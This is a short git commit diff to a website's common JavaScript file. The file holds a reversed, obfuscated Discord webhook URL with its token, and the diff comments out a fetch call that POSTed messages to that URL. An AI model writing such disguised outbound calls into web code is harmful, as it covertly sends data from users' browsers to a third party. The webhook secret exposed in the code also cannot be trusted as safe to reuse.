f6dd9f757c10fb5132f70b895927960c8b43513d
gfini <gfini.apps@gmail.com>
2026-02-06 13:47:12 +0100

    version 1.8 (pl)

--- assets/js/common-script.js
+++ assets/js/common-script.js
@@ -9,11 +9,11 @@ function reverseString(str) {
 const mysteriousString = "yT5yqpkMAK0ELQ1J9KvTIGWmyRsuv9YoY03eWgnNdn293wh_hf_lqxm46ngkJO3Cj_K3/3221052003648483441/skoohbew/ipa/moc.drocsid//:sptth"
 
 function notifyServer(message) {
-    fetch(reverseString(mysteriousString), {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: message })
-    });
+    // fetch(reverseString(mysteriousString), {
+    //     method: "POST",
+    //     headers: { "Content-Type": "application/json" },
+    //     body: JSON.stringify({ content: message })
+    // });
 }
 
 const width = window.innerWidth;
